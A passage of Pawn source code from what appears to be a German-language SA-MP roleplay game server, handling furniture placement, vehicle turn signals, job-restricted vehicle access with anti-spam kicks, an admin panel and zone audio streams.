		    else if(lr > 0) MoebelChoose[playerid]++; if(MoebelChoose[playerid] > sizeof(MoebelStueck[])-1 || MoebelStueck[MoebelKategorie[playerid]][MoebelChoose[playerid]][0] == 0) MoebelChoose[playerid] = 0;
		    if(lr != 0)
		    {
		        printf("%d[%d] - %d",MoebelStueck[MoebelKategorie[playerid]][MoebelChoose[playerid]][0],MoebelChoose[playerid],MoebelStueck[MoebelKategorie[playerid]][MoebelChoose[playerid]][1]);
		        PlayerTextDrawHide(playerid,MoebelKauf[playerid][6]);
			    PlayerTextDrawSetPreviewModel(playerid,MoebelKauf[playerid][6],MoebelStueck[MoebelKategorie[playerid]][MoebelChoose[playerid]][0]);
			    PlayerTextDrawSetPreviewRot(playerid,MoebelKauf[playerid][6], 0.0, 0.0, 140.0, 1.0);
			    PlayerTextDrawShow(playerid,MoebelKauf[playerid][6]);
			    format(string,sizeof string,"%d",MoebelStueck[MoebelKategorie[playerid]][MoebelChoose[playerid]][1]);
			    PlayerTextDrawSetString(playerid, MoebelKauf[playerid][8],string);
		    }
		}
		else if(KleidungChoose[playerid] > 0)
		{
		    new Keys,ud,lr;
   			GetPlayerKeys(playerid,Keys,ud,lr);
   			if(lr < 0) KleidungChoose[playerid]--; if(KleidungChoose[playerid] < 1) KleidungChoose[playerid] = sizeof(SkinsMaenner)-1;
		    else if(lr > 0) KleidungChoose[playerid]++; if(KleidungChoose[playerid] > sizeof(SkinsMaenner)-1) KleidungChoose[playerid] = 1;
		    if(lr != 0)SetPlayerSkin(playerid,SkinsMaenner[KleidungChoose[playerid]-1]);
		}
		else if(KleidungChoose[playerid] < 0)
		{
		    new Keys,ud,lr;
   			GetPlayerKeys(playerid,Keys,ud,lr);
   			if(lr < 0) KleidungChoose[playerid]++; if(KleidungChoose[playerid] > -1) KleidungChoose[playerid] = (sizeof(SkinsFrauen)-1)*(-1);
		    else if(lr > 0) KleidungChoose[playerid]--; if(KleidungChoose[playerid] < (sizeof(SkinsFrauen)-1)*(-1)) KleidungChoose[playerid] = -1;
		    if(lr != 0)SetPlayerSkin(playerid,SkinsFrauen[(KleidungChoose[playerid]+1)*(-1)]);
		}
	}
	new Float:x,Float:y,Float:z;
    GetPlayerCameraFrontVector(playerid,x,y,z);
    if(((-1.0< x <1.0) && (-1.0< y <1.0) && (-1.0< z <1.0)) == false)
    {
        if(AOFCT[playerid] > GetTickCount())AOFCW{playerid}++; else AOFCW{playerid}=0;
        AOFCT[playerid]=GetTickCount()+1000;
        if(AOFCW{playerid} == 2)
        {
            Kick(playerid);
        }
        return 0;
    }
	return 1;
}

public B_DisableBlinks(vehicleid)
{
    for(new i=0;i<4;i++)
    {
    	if(Blink[vehicleid][i] != -1) DestroyDynamicObject(Blink[vehicleid][i]);
    	Blink[vehicleid][i] = -1;
    }
    return 1;
}

stock DisableCarBlinking(veh)
{
	if(!IsCarBlinking(veh)) return 1;
    B_DisableBlinks(veh);
	return 1;
}

stock IsCarBlinking(vehicleid)
{
    if((BlinkSide[vehicleid] == 0 && Blink[vehicleid][0] == -1 && Blink[vehicleid][1] == -1) || (BlinkSide[vehicleid] == 1 && Blink[vehicleid][2] == -1 && Blink[vehicleid][3] == -1)) return 0;
    else if(Blink[vehicleid][0] == -1 && Blink[vehicleid][1] == -1 && Blink[vehicleid][2] == -1 && Blink[vehicleid][3] == -1) return 0;
    return 1;
}

stock B_IsTrailer(vehicleid)
{
    switch(GetVehicleModel(vehicleid))
    {
        case 435, 450, 584, 591, 606: return 1;
    }
    return 0;
}

public B_OnTrailerDetached(trailerid, fromvehicleid)
{
    if(IsCarBlinking(fromvehicleid))
    {
        DisableCarBlinking(fromvehicleid);
        SetCarBlinking(fromvehicleid, BlinkSide[fromvehicleid]);
    }
    TrailerVehicle[trailerid] = 0;
}

public B_OnTrailerAttached(trailerid, tovehicleid)
{
    if(IsCarBlinking(tovehicleid))
    {
        DisableCarBlinking(tovehicleid);
        SetCarBlinking(tovehicleid, BlinkSide[tovehicleid]);
    }
    TrailerVehicle[trailerid] = tovehicleid;
}

public B_TrailerCheck()
{
    new trailer;
    for(new i=0;i<MAX_VEHICLES;i++)
    {
        if((trailer = GetVehicleTrailer(i)) != 0)
        {
            if(BlinkTrailer[i] == 0)
            {
                BlinkTrailer[i]=trailer;
                B_OnTrailerAttached(trailer, i);
            }
        }
        else if(BlinkTrailer[i] != 0)
        {
            B_OnTrailerDetached(BlinkTrailer[i], i);
            BlinkTrailer[i] = 0;
        }
    }
}

public OnPlayerEditObject( playerid, playerobject, objectid, response,Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ )
{
    return 1;
}
stock generate_tree()
{
	new rand = random(sizeof(baum_umgefallen));new stext[84];
	baum_obj=CreateDynamicObjectEx(659, baum_umgefallen[rand][0],baum_umgefallen[rand][1],baum_umgefallen[rand][2],   0.00000, 90.00000, baum_umgefallen[rand][3],150.0,150.0);
	baum_umgefallen[rand][4]=2500.0;
	format(stext,sizeof(stext),"Umgefallender Baum\nStatus: %0.0f / 2500",baum_umgefallen[rand][4]);
	baum_state=Create3DTextLabel(stext,0x00E0FFB9,baum_umgefallen[rand][0],baum_umgefallen[rand][1],baum_umgefallen[rand][2],15.0,0,0);
	return 1;
}
stock remove_all_trees()
{
	DestroyDynamicObject(baum_obj);
	Delete3DTextLabel(baum_state);
 	baum_state = Text3D:INVALID_3DTEXT_ID;
	return 1;
}
stock SetCarBlinking(veh, side, bool:skip=false) //0 - left 1 - right 2 - emergy
{
    if(IsCarBlinking(veh) && !skip) return DisableCarBlinking(veh);
    new model=GetVehicleModel(veh),obj[4];
    new id = model-400, trailer;

    if(!skip) BlinkSide[veh] = side;

    GetVehicleZAngle(veh, BlinkR[veh]);

    if(id > -1)
    {
        if(BlinkOffset[id][bX] != 0.0)
        {
            if(side == 0)
            {
                obj[0] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0); //blink yellow  front
                Blink[veh][0] = obj[0];
            }
            else
            {
                obj[2] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
                Blink[veh][2] = obj[2];
            }
        }
        if((trailer = GetVehicleTrailer(veh)) != 0)
        {
            if(B_IsTrailer(trailer))
            {
                if(side == 0)
                {
                    obj[1] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0); //blink yellow back truck only trailer
                    Blink[veh][1] = obj[1];
                }
                else
                {
                    obj[3] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
                    Blink[veh][3] = obj[3];
                }
            }
        }
        else
        {
            if(BlinkOffset[id][brX] != 0.0)
            {
                if(side == 0)
                {
                    obj[1] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0); //blink yellow back truck only trailer
                    Blink[veh][1] = obj[1];
                }
                else
                {
                    obj[3] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
                    Blink[veh][3] = obj[3];
                }
            }
        }

        if(side == 0) //left
        {
            if(obj[0] != 0) AttachDynamicObjectToVehicle(obj[0], veh, BlinkOffset[id][bX],BlinkOffset[id][bY],BlinkOffset[id][bZ], 0.0, 0.0, 0.0);
            if(trailer != 0)
            {
                id = GetVehicleModel(trailer)-400;
                AttachDynamicObjectToVehicle(obj[1], trailer, BlinkOffset[id][brX],BlinkOffset[id][brY],BlinkOffset[id][brZ], 0.0, 0.0, 0.0);
            }
            else
            {
                if(obj[1] != 0) AttachDynamicObjectToVehicle(obj[1], veh, BlinkOffset[id][brX],BlinkOffset[id][brY],BlinkOffset[id][brZ], 0.0, 0.0, 0.0);
            }
        }
        else if(side == 1) //right
        {
            if(obj[2] != 0) AttachDynamicObjectToVehicle(obj[2], veh, -BlinkOffset[id][bX],BlinkOffset[id][bY],BlinkOffset[id][bZ], 0.0, 0.0, 0.0);
            if(trailer != 0)
            {
                id = GetVehicleModel(trailer)-400;
                AttachDynamicObjectToVehicle(obj[3], trailer, -BlinkOffset[id][brX],BlinkOffset[id][brY],BlinkOffset[id][brZ], 0.0, 0.0, 0.0);
            }
            else
            {
                if(obj[3] != 0) AttachDynamicObjectToVehicle(obj[3], veh, -BlinkOffset[id][brX],BlinkOffset[id][brY],BlinkOffset[id][brZ], 0.0, 0.0, 0.0);
            }
        }
        else if(side == 2)  //emergency
        {
            SetCarBlinking(veh, 0, true);
            SetCarBlinking(veh, 1, true);
        }
    }
	return 1;
}

stock ObjectToPoint(objectid, Float:radi, Float:x, Float:y, Float:z)
{
  new Float:oldposx, Float:oldposy, Float:oldposz;
  new Float:tempposx, Float:tempposy, Float:tempposz;
  GetDynamicObjectPos(objectid, oldposx, oldposy, oldposz);
  tempposx = (oldposx -x);
  tempposy = (oldposy -y);
  tempposz = (oldposz -z);
  if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
  {
   return 1;
  }
  return 0;
}
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(IsPlayerNPC(playerid)) return 1;
	mbekommen[playerid] = 0;
	if(!ispassenger)
	{
	    if(vehicleid == geldtransporter)
		{
	    	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2) && !IstSpielerInFrak(playerid,15))
	    	{
	    	    ShowPlayerDialog(playerid,DIALOG_GELDTRANS,DIALOG_STYLE_MSGBOX,"Geldtransporter","Möchtest du den Geldtransporter wirklich klauen?\nDu könntest Wanteds bekommen!","Ja","Nein");

			}
			else
			{
			    geldtransporterdriver = playerid;
			    SendClientMessage(playerid,COLOR_GREEN,"Bringe den Geldtransporter zur Santa Felton Bank!");
			    SetPlayerCheckpoint(playerid,6407.9648,-7717.6069,4.2186-1,5.0);
			    SendClientMessageToAll(COLOR_HQ,"HQ: Die Polizei hat den Geldtransporter und überführt ihn nach Santa Felton!");
			}
		}
	}
	if(playervehiclemerk[playerid] != vehicleid && PlayerTrucker[playerid] == 2)
	{
	    SendClientMessage(playerid,COLOR_RED,"Der Job wurde abgebrochen, da du in ein anderes Fahrzeug gestiegen bist!");
     	SetVehicleToRespawn(playervehiclemerk[playerid]);
	    PlayerTrucker[playerid] = 0;
	    PlayerTruckmodus[playerid] = 0;
	    TruckSpritmodus[playerid] = 0;
	}
	if(playervehiclemerk[playerid] != vehicleid && PlayerTrucker[playerid] == 1)
	{
	    SendClientMessage(playerid,COLOR_RED,"Der Job wurde abgebrochen, da du in ein anderes Fahrzeug gestiegen bist!");
     	SetVehicleToRespawn(playervehiclemerk[playerid]);
	    vehicleprodukte[playervehiclemerk[playerid]] = 0;
	    PlayerTrucker[playerid] = 0;
	    PlayerTruckmodus[playerid] = 0;
	    PlayerProdukt[playerid] = 0;
	}
	if(playervehiclemerk[playerid] == vehicleid && PlayerTrucker[playerid] == 1)
	{
	    KillTimer(Truckertimer[playerid]);
	    truckrespawn[playerid] = 0;
	}
	if(playervehiclemerk[playerid] == vehicleid && PlayerTrucker[playerid] == 2)
	{
	    KillTimer(Truckertimer[playerid]);
	    truckrespawn[playerid] = 0;
	}
	if(Motorschaden2[vehicleid] == 1)
	{
        SendClientMessage(playerid,COLOR_RED,"Das Fahrzeug hat einen Motorschaden. Rufe das Fire & Rescue Department mit /service!");
        new engine,lights,alarm,doors,bonnet,boot,objective;
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
	}
	for(new x = 0; x < sizeof(Ausstellung)-1; x++)
	{
	    if(vehicleid == Ausstellung[x])
	    {
	    	SendClientMessage(playerid,COLOR_RED,"Dies ist ein Ausstellungsmodell!");
			Freeze(playerid); Unfreeze(playerid);
	    }
	}
	for(new y = 0; y < 2; y++)
	{
		for(new x = 0; x < sizeof(AutohausAutos[])-1; x++)
		{
		    if(IsValidVehicle(AutohausAutos[y][x][0]) && vehicleid == AutohausAutos[y][x][0])
		    {
		        SendClientMessage(playerid,COLOR_RED,"Fahrzeuge kannst du im Info-Icon erwerben!");
				Freeze(playerid); return Unfreeze(playerid);
		    }
		}
	}
	for(new x = 0; x < sizeof(ADACZone); x++)
	{
		if(IsPlayerInDynamicArea(playerid,ADACZone[x]) && IstSpielerInFrak(playerid,5))
		{
	 		SetVehicleParamsForPlayer(vehicleid, playerid, 0, 0);
	 		break;
		}
	}
	new str[150];
	if(!ispassenger && AutosFahrbar[playerid] == 0)
	{
	    for(new x = 0; x < sizeof(holzi); x++)
		{
			if(vehicleid == holzi[x])
			{
				new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
			    if(SpielerInfo[playerid][uJob] != 6)
				{
					SendClientMessage(playerid,COLOR_RED,"Du bist kein Holzfäller!");
					Freeze(playerid); Unfreeze(playerid);
					anticheatpl[playerid] ++;
					SetTimerEx("RESETPL", 10000, false, "d", playerid);
					if(anticheatpl[playerid] == 5)
					{
						format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
						SendClientMessageToAll(COLOR_LIGHTRED,str);
						SetTimerEx("KICKHIM", 200, false, "d", playerid);
					}
				}
				break;
			}
		}
	    for(new x = 0; x < sizeof(ReinigungsFahrzeug); x++)
		{
			if(vehicleid == ReinigungsFahrzeug[x])
			{
				new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
			    if(SpielerInfo[playerid][uJob] != 1)
				{
					SendClientMessage(playerid,COLOR_RED,"Du bist kein Müllmann!");
					Freeze(playerid); Unfreeze(playerid);
					anticheatpl[playerid] ++;
					SetTimerEx("RESETPL", 10000, false, "d", playerid);
					if(anticheatpl[playerid] == 5)
					{
						format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
						SendClientMessageToAll(COLOR_LIGHTRED,str);
						SetTimerEx("KICKHIM", 200, false, "d", playerid);
					}
				}
				break;
			}
		}
		for(new x = 0; x < sizeof(FarmerFahrzeug); x++)
		{
			if(vehicleid == FarmerFahrzeug[x])
			{
			    new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
			    if(SpielerInfo[playerid][uJob] != 4)
				{
					SendClientMessage(playerid,COLOR_RED,"Du bist kein Farmer!");
					Freeze(playerid); Unfreeze(playerid);
					anticheatpl[playerid] ++;
					SetTimerEx("RESETPL", 10000, false, "d", playerid);
					if(anticheatpl[playerid] == 5)
					{
						format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
						SendClientMessageToAll(COLOR_LIGHTRED,str);
						SetTimerEx("KICKHIM", 200, false, "d", playerid);
					}
				}
				break;
			}
		}
		for(new x = 0; x < sizeof(Taxi); x++)
		{
			if(vehicleid == Taxi[x])
			{
			    new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
   				if(SpielerInfo[playerid][uJob] != 2)
				{
					Freeze(playerid); Unfreeze(playerid);
					anticheatpl[playerid] ++;
					SetTimerEx("RESETPL", 10000, false, "d", playerid);
					if(anticheatpl[playerid] == 5)
					{
						format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
						SendClientMessageToAll(COLOR_LIGHTRED,str);
						SetTimerEx("KICKHIM", 200, false, "d", playerid);
					}
					SendClientMessage(playerid,COLOR_RED,"Du bist kein Taxifahrer!");
  				}
				break;
			}
		}
		for(new x = 0; x < sizeof(Bus); x++)
		{
			if(vehicleid == Bus[x])
			{
			    new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
   				if(SpielerInfo[playerid][uJob] != 3)
				{
					Freeze(playerid); Unfreeze(playerid);
					anticheatpl[playerid] ++;
					SetTimerEx("RESETPL", 10000, false, "d", playerid);
					if(anticheatpl[playerid] == 5)
					{
						format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
						SendClientMessageToAll(COLOR_LIGHTRED,str);
						SetTimerEx("KICKHIM", 200, false, "d", playerid);
					}
					SendClientMessage(playerid,COLOR_RED,"Du bist kein Busfahrer!");
  				}
				break;
			}
		}
		for(new x = 0; x < sizeof(Trucker); x++)
		{
			if(vehicleid == Trucker[x])
			{
			    new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(vehicleid, engine, lights, alarm, VEHICLE_PARAMS_OFF, bonnet, boot, objective);
   				if(SpielerInfo[playerid][uJob] != 5)
				{
					Freeze(playerid); Unfreeze(playerid);
					anticheatpl[playerid] ++;
					SetTimerEx("RESETPL", 10000, false, "d", playerid);
					if(anticheatpl[playerid] == 5)
					{
						format(str,sizeof(str),"%s wurde gekickt wegen Spam!",PlayerName(playerid));
						SendClientMessageToAll(COLOR_LIGHTRED,str);
						SetTimerEx("KICKHIM", 200, false, "d", playerid);
					}
					SendClientMessage(playerid,COLOR_RED,"Du bist kein Trucker!");
  				}
				break;
			}
		}
		for(new x = 1; x < 18; x++)
		{
		    for(new y = 0; y < 20; y++)
		    {
		        if(vehicleid == FrakFahrzeuge[x][y][FID])
		        {
		            if(IstSpielerInFrak(playerid,x))
		            {
		                if(SpielerInfo[playerid][uRang] < FrakFahrzeuge[x][y][FRang]) { Freeze(playerid); Unfreeze(playerid); SendClientMessage(playerid,COLOR_RED,"Dein Rang reicht für dieses Fahrzeug nicht aus!"); return 1; }
		            }
		            else if(IstSpielerInFrak(playerid,4) || IstSpielerInFrak(playerid,3)){}
					else
					{
					    if(x != 6)
			    		{
							Freeze(playerid); Unfreeze(playerid);
							SendClientMessage(playerid,COLOR_RED,"Du hast keinen Schlüssel!");
						}
						else if(!IsPlayerInDynamicArea(playerid,FSZone))
						{
						    Freeze(playerid); Unfreeze(playerid);
							SendClientMessage(playerid,COLOR_RED,"Du hast keinen Schlüssel!");
						}
					}
		        }
		    }
		}
	}
	return 1;
}



forward truckerre(playerid);
public truckerre(playerid)
{
    SendClientMessage(playerid,COLOR_YELLOW,"Dein Truck wurde respawnt!");
    SetVehicleToRespawn(playervehiclemerk[playerid]);
    vehicleprodukte[playervehiclemerk[playerid]] = 0;
    PlayerTrucker[playerid] = 0;
    PlayerTruckmodus[playerid] = 0;
    PlayerProdukt[playerid] = 0;
    TruckSpritmodus[playerid] = 0;
	return 1;
}
public OnPlayerExitVehicle(playerid, vehicleid)
{
    if(vehicleid == geldtransporter)
	{
	    if(playerid == geldtransporterdriver)
	    {
	        geldtransporterdriver = -1;
	    }
	}
	if(playerradio[playerid] == 1)
	{
		StopAudioStreamForPlayer(playerid);
		playerradio[playerid] = 0;
	}
	AntiCheat[playerid][cAnti] = 2;
	if(GetVehicleModel(vehicleid) == 478)
	{
	    if(SpielerInfo[playerid][uJob] == 6)
	    {
 			SendClientMessage(playerid,COLOR_GREEN,"Säge einen Baum um. Das Holz landet in deinem Inventar.");
  		}
	}
	if(playervehiclemerk[playerid] == vehicleid && PlayerTrucker[playerid] == 2)
	{
	    SendClientMessage(playerid,COLOR_YELLOW,"Du hast deinen Truck verlassen! Du hast 5 Minuten Zeit!");
	    Truckertimer[playerid] = SetTimerEx("truckerre",1000*60*5,0,"d",playerid);
	    truckrespawn[playerid] = 1;
	}
	if(playervehiclemerk[playerid] == vehicleid && PlayerTrucker[playerid] == 1)
	{
	    SendClientMessage(playerid,COLOR_YELLOW,"Du hast für deine Beschäftigung 5 Minuten Zeit!");
	    Truckertimer[playerid] = SetTimerEx("truckerre",1000*60*5,0,"d",playerid);
	    truckrespawn[playerid] = 1;
	}
	if(taxilabel[vehicleid] == 1)
	{
	    Delete3DTextLabel(taxitext[vehicleid]);
	    taxitext[vehicleid] = Text3D:INVALID_3DTEXT_ID;
	    taxilabel[vehicleid] = 0;
	}
	if(Buslinie[playerid] > 0)
	{
 		DisablePlayerCheckpoint(playerid);
   		Buslinie[playerid] = 0;
   		SendClientMessage(playerid,COLOR_RED,"Du hast den Bus Job abgebrochen!");
   		//SetVehicleToRespawn(vehicleid);
	}
	if(Fahrstunde[playerid] > 0)
	{
	    SendClientMessage(playerid,COLOR_RED,"Fahrschulfahrzeug verlassen! Du bist durchgefallen!");
	    Teleport(playerid,1594.1910,-8439.3672,7.0640);//Kann sein das er durch die Map fällt
	    Freeze(playerid); SetTimerEx("Unfreeze",4000,0,"d",playerid);
	    Fahrstunde[playerid] = 0;
	    Fahrschulcp[playerid] = 0;
	    DisablePlayerCheckpoint(playerid);
	}
	if(GetVehicleModel(vehicleid) == 578)
	{
	    new Float:angle,Float:X,Float:Y,Float:Z;
	    GetVehicleZAngle(vehicleid,angle);
	    GetPlayerPos(playerid,X,Y,Z);
	    if(angle > 45 && angle < 135)
	    {
	    	Teleport(playerid,X,Y-2,Z);
	    }
	    else if(angle > 135 && angle < 225)
	    {
	    	Teleport(playerid,X+2,Y,Z);
	    }
	    else if(angle > 225 && angle < 315)
	    {
	    	Teleport(playerid,X,Y+2,Z);
	    }
	    else
	    {
	    	Teleport(playerid,X-2,Y,Z);
	    }
	}
	if(GetVehicleModel(vehicleid) == 420)
	{
	    Delete3DTextLabel(taxitext[GetPlayerVehicleID(playerid)]);
	    taxitext[GetPlayerVehicleID(playerid)] = Text3D:INVALID_3DTEXT_ID;
	    taxilabel[vehicleid] = 0;
	}
    return 1;
}
forward Bombensetz();
public Bombensetz()
{
    bombenklauen = 0;
	return 1;
}
public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid)
{
    PlayerPlaySound(issuerid,17802,0.0,0.0,0.0);
	if(SpawnSchutz[playerid])
	{
	    GebeLeben(playerid,100);
	}
	return 1;
}
public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid, bodypart)
{
	new str[160];
	format(str,sizeof(str),"%s hat %s schaden zugefügt. Waffenname %s Schaden: %.1f Bodypart: %i",PlayerName(playerid),PlayerName(damagedid),WaffenName[weaponid],amount,bodypart);
    log(playerid, 4, str);
    return 1;
}
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(SpielerInfo[playerid][uAdmin] < 1) return false;
	for(new x = 0; x < 17; x++)
	{
	    TextDrawShowForPlayer(playerid,AdminPanel[x]);
	}
	PlayerTextDrawHide(playerid, AdminPanelName[playerid]);
	PlayerTextDrawDestroy(playerid, AdminPanelName[playerid]);
	AdminPanelName[playerid] = CreatePlayerTextDraw(playerid,250.000000, 54.000000, PlayerName(clickedplayerid));
	PlayerTextDrawBackgroundColor(playerid,AdminPanelName[playerid], 255);
	PlayerTextDrawFont(playerid,AdminPanelName[playerid], 1);
	PlayerTextDrawLetterSize(playerid,AdminPanelName[playerid], 0.519999, 1.800000);
	PlayerTextDrawColor(playerid,AdminPanelName[playerid], -1);
	PlayerTextDrawSetOutline(playerid,AdminPanelName[playerid], 0);
	PlayerTextDrawSetProportional(playerid,AdminPanelName[playerid], 1);
	PlayerTextDrawSetShadow(playerid,AdminPanelName[playerid], 1);
	PlayerTextDrawShow(playerid,AdminPanelName[playerid]);
	SelectTextDraw(playerid, 0x00FF00FF);
	TogglePlayerControllable(playerid,false);
	ClickedID[playerid] = clickedplayerid;
	return 1;
}
public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new editallowed = 0;
	for(new m = 0; m < aobjanzahl; m++)
	{
	    if(objectid == AdminObjecte[m])
	    {
	        if(response == EDIT_RESPONSE_CANCEL || response == EDIT_RESPONSE_FINAL)
	        {
	       	 	SetDynamicObjectPos(AdminObjecte[m],x,y,z);
	       	 	SetDynamicObjectRot(AdminObjecte[m],rx,ry,rz);
	        }
	        editallowed = 1;
	        break;
	    }
	}
	if(editallowed == 0)
	{
		new Float:oldX, Float:oldY, Float:oldZ,Float:oldRotX, Float:oldRotY, Float:oldRotZ;
		GetDynamicObjectPos(objectid, oldX, oldY, oldZ);
		GetDynamicObjectRot(objectid, oldRotX, oldRotY, oldRotZ);
		if(ObjectSet[playerid] != 0)
		{
		 	if(!IsPointInDynamicArea(HausInfo[SpielerInfo[playerid][uHausschluessel]][hArea],x,y,z))
			{
				SendClientMessage(playerid,COLOR_RED,"Dieses Möbelstück steht außerhalb des Hauses!");
				SetDynamicObjectPos(EditingObject[playerid],oldX,oldY,oldZ);
			}
			if(response == EDIT_RESPONSE_FINAL)
			{
			    if(!IsPointInDynamicArea(HausInfo[SpielerInfo[playerid][uHausschluessel]][hArea],x,y,z))
				{
					SendClientMessage(playerid,COLOR_RED,"Dieses Möbelstück steht außerhalb des Hauses!");
					DestroyDynamicObject(EditingObject[playerid]);
				}
				else
				{
				    DestroyDynamicObject(EditingObject[playerid]);
					EditingObject[playerid] = INVALID_VEHICLE_ID;
			 		Moebel[SpielerInfo[playerid][uHausschluessel]][Moebelanzahl[SpielerInfo[playerid][uHausschluessel]]] = CreateDynamicObject(EditingObjectModel[playerid],x,y,z,rx,ry,rz);
			   		SendClientMessage(playerid,COLOR_GREEN,"Möbelstück erfolgreich positioniert.");
			   		ObjectSet[playerid] = 0;
			   		Inventar[playerid][ClickedInvantarID[playerid]] = -1;//Aus Inventar löschen
			   		Moebelanzahl[SpielerInfo[playerid][uHausschluessel]]++;
	   			}
			}
			else if(response == EDIT_RESPONSE_CANCEL)
			{
		 		DestroyDynamicObject(EditingObject[playerid]);
		 		ObjectSet[playerid] = 0;
		    }
		}
		else
		{
		    if(!IsPointInDynamicArea(HausInfo[SpielerInfo[playerid][uHausschluessel]][hArea],x,y,z))
			{
				SendClientMessage(playerid,COLOR_RED,"Dieses Möbelstück steht außerhalb des Hauses!");
				SetDynamicObjectPos(EditingObject[playerid],oldX,oldY,oldZ);
			}
			else if(response == EDIT_RESPONSE_FINAL)
			{
			    if(!IsPointInDynamicArea(HausInfo[SpielerInfo[playerid][uHausschluessel]][hArea],x,y,z))
				{
					SendClientMessage(playerid,COLOR_RED,"Dieses Möbelstück steht außerhalb des Hauses!");
					SetDynamicObjectPos(objectid,oldX,oldY,oldZ);
				}
				else
				{
			   		SendClientMessage(playerid,COLOR_GREEN,"Möbelstück erfolgreich bearbeitet.");
			   		SetDynamicObjectPos(objectid,x,y,z);
			 		SetDynamicObjectRot(objectid,rx,ry,rz);
	   			}
			}
			else if(response == EDIT_RESPONSE_CANCEL)
			{
			    SetDynamicObjectPos(EditingObject[playerid],oldX,oldY,oldZ);
			    SetDynamicObjectRot(EditingObject[playerid],oldRotX,oldRotY,oldRotZ);
			}
		}
	}
}
public OnPlayerEnterDynamicArea(playerid, areaid)
{
    for(new x = 0; x < sizeof(ADACZone); x++)
    {
		if(areaid == ADACZone[x] && IstSpielerInFrak(playerid,5))
		{
			AutosFahrbar[playerid]= true;
			break;
		}
	}
	if(areaid == CasinoZone)
	{
	    PlayAudioStreamForPlayer(playerid,"https://iloveradio.de/iloveradio.m3u");
	}
	if(areaid == AufzugZone)
	{
	    PlayAudioStreamForPlayer(playerid,"https://county-islands.com/sounds/aufzug.mp3");
	}
	if(areaid == KleidungZone || areaid == MoebelZone || areaid == BSZone || areaid == ShopZone || areaid == SpawnZone)
	{
	    PlayAudioStreamForPlayer(playerid, "https://county-islands.com/sounds/listen.m3u");
	}
	if(areaid == FSHausZone)
	{
	    SendClientMessage(playerid,COLOR_GREEN,"Steige in ein Fahrzeug der Fahrschule um die Fahrprüfung zu beginnen!");
	}
	return 1;
}
forward RESETPL(playerid);
public RESETPL(playerid){
	anticheatpl[playerid] = 0;
	return 1;
}
forward KICKHIM(playerid);
public KICKHIM(playerid)
{
    Kick(playerid);
	return 1;
}
public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	if(!IsPlayerNPC(playerid))
    /*for(new x = 0; x < sizeof(ADACZone); x++)
    {
	    if(areaid == ADACZone[x])
		{
			AutosFahrbar[playerid]= false;
		}
	}*/
	if(areaid == CasinoZone || areaid == AufzugZone || areaid == KleidungZone || areaid == MoebelZone || areaid == BSZone || areaid == ShopZone || areaid == SpawnZone)
	{
	    StopAudioStreamForPlayer(playerid);
	}
//	new id = 0;
	//afterhaus:
}
public OnUnoccupiedVehicleUpdate(vehicleid, playerid, passenger_seat)
{
	if(Abschleppen[GetPlayerVehicleID(playerid)] == vehicleid)
	{
		printf("Update von %s für %d",PlayerName(playerid),vehicleid);
		return;
	}
	if(ADACVehicleStream[vehicleid] != -1 && playerid != ADACVehicleStream[vehicleid])
	{
	    return;
	}
}
AdminPanelAbbrechen(playerid)
{
	for(new x = 0; x < 17; x++)
	{
 		TextDrawHideForPlayer(playerid,AdminPanel[x]);
	}
	PlayerTextDrawHide(playerid,AdminPanelName[playerid]);
	PlayerTextDrawDestroy(playerid,AdminPanelName[playerid]);
	Unfreeze(playerid);
	CancelSelectTextDraw(playerid);
	WantedAnzeige(playerid);
	GeldAnzeigepl(playerid);
}
forward ErstellenHunger(playerid);
